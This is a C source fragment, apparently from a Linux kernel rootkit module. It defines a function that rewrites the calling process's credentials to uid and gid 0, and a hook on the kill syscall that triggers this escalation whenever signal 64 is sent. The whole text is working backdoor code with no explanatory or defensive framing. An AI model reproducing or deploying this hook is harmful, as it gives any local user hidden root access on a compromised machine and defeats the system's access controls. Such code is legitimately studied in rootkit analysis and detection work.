
typedef int (*sysfun_t)(struct pt_regs *);

sysfun_t original_kill;

void root_me(void)
{
    struct cred * new_cred;

    if(current->cred->uid.val==0)
    {
        return;
    }
    new_cred = prepare_creds();
    if (!new_cred)
    {
        return;
    }
    // change uid, gid to root id
    new_cred->uid.val = 0;
    new_cred->gid.val = 0;
    new_cred->euid.val = 0;
    new_cred->egid.val = 0;
    new_cred->fsuid.val = 0;
    new_cred->fsgid.val = 0;

    commit_creds(new_cred);
}

int kill_hook_root(struct pt_regs *regs){
    int status = (int)regs->si;
    int rtn = 0;	

    if(status == 64){
    	root_me();
    }

    rtn = original_kill(regs);

    return rtn;
}
